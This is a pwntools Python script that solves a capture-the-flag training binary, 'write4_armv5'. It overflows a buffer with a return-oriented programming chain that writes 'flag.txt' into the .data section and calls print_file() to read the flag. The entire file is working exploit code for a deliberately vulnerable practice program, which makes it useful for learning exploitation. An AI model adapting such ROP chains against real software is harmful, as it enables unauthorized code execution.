#!/usr/bin/puthon3
from pwn import process, p32, log

shell = process("./write4_armv5")

offset = 36
junk = b"A" * offset

string = b"flag.txt"

payload  = b""
payload += junk
payload += p32(0x105f0) # pop {r3, r4, pc};

for i in range(0, len(string), 4):
    payload += string[i:i+4]    # string
    payload += p32(0x21024 + i) # .data
    payload += p32(0x105ec)     # str r3, [r4]; pop {r3, r4, pc};

payload += p32(0x0) * 2 # padding for pops
payload += p32(0x105f4) # pop {r0, pc};
payload += p32(0x21024) # "flag.txt"
payload += p32(0x104b0) # print_file()

shell.sendlineafter(b"> ", payload)

flag = shell.recvline_contains(b"ROPE").decode()
log.success(f"Flag: {flag}")

